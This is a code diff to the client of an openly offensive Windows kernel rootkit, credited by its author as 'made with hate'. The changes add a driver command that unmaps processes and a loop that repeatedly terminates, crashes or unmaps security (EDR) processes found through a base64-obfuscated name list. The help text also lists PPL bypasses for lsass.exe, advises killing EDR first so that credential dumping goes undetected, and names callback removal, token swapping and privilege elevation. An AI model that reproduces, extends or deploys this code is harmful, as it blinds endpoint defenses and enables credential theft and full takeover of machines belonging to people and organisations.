@@ -14,6 +14,7 @@
 
 int stop_term_thread = 0;
 int stop_crash_thread = 0;
+int stop_unmap_thread = 0;
 
 struct threadArgs {
     HANDLE hDevice;
@@ -44,6 +45,7 @@ struct threadArgs {
 #define IOCTL_PROC_TOKEN_SWAP CTL_CODE_HIDE(13)
 #define IOCTL_UMPROC_HIDE CTL_CODE_HIDE(14)
 #define IOCTL_UNLINK_ROOTKIT_DRV CTL_CODE_HIDE(15)
+#define IOCTL_UNMAP_PROC CTL_CODE_HIDE(16)
 
 
 
@@ -340,6 +342,21 @@ BOOL CrashProc(HANDLE hDevice, DWORD pid) {
         NULL);
     return result;
 }
+
+BOOL unmapProc(HANDLE hDevice, DWORD pid) {
+    DWORD bytesReturned;
+    BOOL result = DeviceIoControl(
+        hDevice,
+        IOCTL_UNMAP_PROC,
+        &pid,
+        sizeof(pid),
+        NULL,
+        0,
+        &bytesReturned,
+        NULL);
+    return result;
+}
+
 void killer_callback(threadArgs* args) {
 
     HANDLE hDevice = args->hDevice;
@@ -347,7 +364,21 @@ void killer_callback(threadArgs* args) {
 
 	int edrCount = sizeof(edrNames) / sizeof(edrNames[0]);
 
-    while (!stop_term_thread) {
+	int stop_what = 0;
+    if (mode == 1) {
+        stop_what = stop_term_thread;
+        printf("Starting EDR termination thread...\n");
+    }
+    else if (mode == 2) {
+        stop_what = stop_crash_thread;
+        printf("Starting EDR crash thread...\n");
+    }
+    else if (mode == 3) {
+        stop_what = stop_unmap_thread;
+        printf("Starting EDR unmap thread...\n");
+    }
+
+    while (!stop_what) {
         for (size_t i = 0; i < edrCount; i++) {
             char* decodedName = base64_decode(edrNames[i]);
             if (decodedName) {
@@ -359,9 +390,17 @@ void killer_callback(threadArgs* args) {
                     if (mode == 1){
                         result = Terminate(hDevice, pid);
                     }
-                    if (mode == 2) {
+                    else if (mode == 2) {
                         result = CrashProc(hDevice, pid);
                     }
+                    else if (mode == 3) {
+                        result = unmapProc(hDevice, pid);
+                    }
+                    else {
+                        fprintf(stderr, "Invalid mode selected.\n");
+                        free(decodedName);
+                        return;
+					}
                     if (result) {
                         printf("Sent crash command to process %s (PID %lu)\n", decodedName, pid);
                     }
@@ -917,6 +956,17 @@ int main(int argc, char* argv[])
     const size_t edrCount = sizeof(edrNames) / sizeof(edrNames[0]);
     HANDLE hTerminateThread;
 	HANDLE hCrashThread;
+	HANDLE hUnmapThread;
+
+    printf("\n");
+    printf("   ____  _   _ ___ _____ ____ _   _    ____  _        _ __   _______ ____  \n");
+    printf("  / ___|| \\ | |_ _|_   _/ ___| | | |  / ___|| |      / \\\\ \\ / / ____|  _ \\ \n");
+    printf("  \\___ \\|  \\| || |  | || |   | |_| |  \\___ \\| |     / _ \\\\ V /|  _| | |_) |\n");
+    printf("   ___) | |\\  || |  | || |___|  _  |   ___) | |___ / ___ \\\\| | | |___|  _ < \n");
+    printf("  |____/|_| \\_|___| |_| \\____|_| |_|  |____/|_____/_/   \\_\\_| |_____|_| \\_\\\n");
+    printf("\n");
+
+    printf("Windows KM Rootkit Made with hate by jakydibe https://github.com/jakydibe\n");
 
 
     while (1) {
@@ -949,6 +999,7 @@ int main(int argc, char* argv[])
         }
         else if (strncmp(input, "exit", 4) == 0) {
             printf("Exiting...\n");
+            CloseHandle(hDevice);
             break;
         }
         else if (strncmp(input, "stopterm", 8) == 0) {
@@ -958,6 +1009,10 @@ int main(int argc, char* argv[])
         else if (strncmp(input, "stopcrash", 9) == 0) {
             printf("Stopping crashing...\n");
             stop_crash_thread = 1;
+		}
+        else if (strncmp(input, "stopunmap", 9) == 0) {
+            printf("Stopping unmapping...\n");
+            stop_unmap_thread = 1;
 		}
         else if (strncmp(input, "kill", 4) == 0) {
             DWORD pid = atoi(input + 5);
@@ -986,6 +1041,33 @@ int main(int argc, char* argv[])
             else {
                 printf("Failed to send crash command. Error: %lu\n", GetLastError());
             }
+        }
+        else if (strncmp(input, "unmapem", 7) == 0) {
+            threadArgs args;
+            args.mode = 3;
+            args.hDevice = hDevice;
+
+            hUnmapThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)killer_callback, &args, 0, NULL);
+            hCrashThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)killer_callback, &args, 0, NULL);
+            if (hCrashThread == NULL) {
+                fprintf(stderr, "Failed to create termination thread. Error: %lu\n", GetLastError());
+                return 1;
+            }
+
+        }
+        else if (strncmp(input, "unmap", 5) == 0) {
+			DWORD pid = atoi(input + 6);
+            if (pid == 0) {
+                printf("Invalid PID.\n");
+                continue;
+			}
+			BOOL result = unmapProc(hDevice, pid);
+            if (result) {
+                printf("Sent unmap command to process with PID %lu\n", pid);
+            }
+            else {
+                printf("Failed to send unmap command. Error: %lu\n", GetLastError());
+			}
         }
         else if (strncmp(input, "listproc", 8) == 0) {
             ListProcNotifyRoutine(hDevice);
@@ -1148,8 +1230,11 @@ int main(int argc, char* argv[])
 			printf("Help menu:\n");
 			printf(" - terminate            - Start killing EDR processes\n");
             printf(" - crashem              - Start crashing EDR processes\n");
+			printf(" - unmapem              - Start unmapping EDR processes (UNSTABLE!)\n");
 			printf(" - kill <PID>           - Kill a specific process by PID\n");
             printf(" - crash <PID>          - crash a specific process by PID\n");
+			printf(" - unmap <PID>          - Unmap a specific process by PID\n\n");
+
 			printf(" - stopterm             - Stop killing EDR processes\n");
 			printf(" - stopcrash			- Stop crashing EDR processes\n\n");
             printf(" - listproc             - List process notify routines\n");
@@ -1165,7 +1250,8 @@ int main(int argc, char* argv[])
 			printf(" - elall                - Eliminate all known EDR callbacks\n\n");     
 
 			printf(" - bypassppl <PID>      - Bypass PPL for a specific process by PID\n");
-			printf(" - bypassppllsass 	    - Bypass PPL for lsass.exe\n\n");
+            printf(" - bypassppllsass 	    - Bypass PPL for lsass.exe (run terminate before otherwise dumping is detected)\n\n");
+
 			printf(" - elevatelocal <PID>   - Elevate a specific process by PID using local system\n");
 			printf(" - downGrade <PID>      - Downgrade a specific process by PID to non-PPL\n\n");
 
